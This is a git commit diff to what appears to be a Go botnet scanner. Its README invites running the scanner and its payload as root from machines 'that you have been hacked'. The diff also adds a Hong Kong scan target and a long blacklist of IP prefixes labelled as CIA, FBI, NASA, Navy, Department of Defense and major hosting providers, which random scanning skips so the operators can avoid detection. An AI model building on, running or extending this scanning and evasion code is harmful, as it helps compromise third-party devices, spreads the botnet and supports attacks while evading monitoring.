22fea4648010a2fe57ff6cce5eac5a81fdcdfee1
Phatcharadol Thangplub <43667929+boz3r@users.noreply.github.com>
2022-04-01 01:13:08 +0700

    Add files via upload

--- bin/README.txt
+++ bin/README.txt
@@ -1,3 +1,4 @@
 The executable file in this folder, should be use for the first scanning and upload to FTP server (For scan process). 
 You can use this executable, scan with your self for the first time to find a bot or you can use severs, devices or 
-anything is run linux that you have been hacked to scan it. It's up to you.
+anything is run linux that you have been hacked to scan it. It's up to you. 
+To run the payload you need to run with root access!!!
--- internal/header.go
+++ internal/header.go
@@ -45,8 +45,8 @@ var ScanMap = map[string]Bot{
 		scanNetwork: ChinaNetwork,
 		isRandom:    false,
 	},
-	"-usa": {
-		scanNetwork: AmericaNetwork,
+	"-hk": {
+		scanNetwork: HongKongNetwork,
 		isRandom:    false,
 	},
 	"-kr": {
@@ -86,10 +86,12 @@ var TCPAttackMap = map[string]Attack{
 
 /*
 	Blacklist IP that will be skip in random scanning process. Skip since first network ID.
+	Some of these first network ID may be anything not mentionally to be the thing that i have commented because i skip since first network ID.
 	I don't recommend you to write map like this in Go, i do this because you know...
 	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IP.
 */
 var BlacklistIP = map[string]struct{}{
+
 	/*
 		Loopback
 	*/
@@ -131,10 +133,71 @@ var BlacklistIP = map[string]struct{}{
 	"224.": {},
 
 	/*
+		CIA
+	*/
+	"162.": {},
+
+	/*
+		Cloudflare
+	*/
+	"104.": {},
+
+	/*
+		NASA Kennedy Space Center
+	*/
+	"163.": {}, "164.": {},
+
+	/*
+		Naval Air Systems Command, VA
+	*/
+	"199.": {},
+
+	/*
+		Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
+	*/
+	"205.": {},
+
+	/*
+		FBI controlled Linux servers & IPs/IP-Ranges
+	*/
+	"207.": {},
+
+	/*
+		Amazon + Microsoft
+	*/
+	"13.": {}, "52.": {}, "54.": {},
+
+	/*
+		Ministry of Education Computer Science
+	*/
+	"120.": {}, "188.": {}, "78.": {},
+
+	/*
+		Total Server Solutions
+	*/
+	"107.": {}, "184.": {}, "206.": {}, "98.": {},
+
+	/*
+		Blazingfast & Nforce
+	*/
+	"63.": {}, "70.": {}, "74.": {},
+
+	/*
+		Choopa & Vultr
+	*/
+	"64.": {}, "185.": {}, "208.": {}, "209.": {}, "45.": {}, "66.": {}, "108.": {}, "216.": {},
+
+	/*
+		OVH
+	*/
+	"149.": {}, "151.": {}, "167.": {}, "176.": {}, "178.": {}, "37.": {}, "46.": {}, "51.": {},
+	"5.": {}, "91.": {},
+
+	/*
 		Department of Defense
 	*/
-	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {},
-	"29.": {}, "30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
+	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {}, "29.": {},
+	"30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
 }
 
 func (b *Bot) AccessPerms() bool {
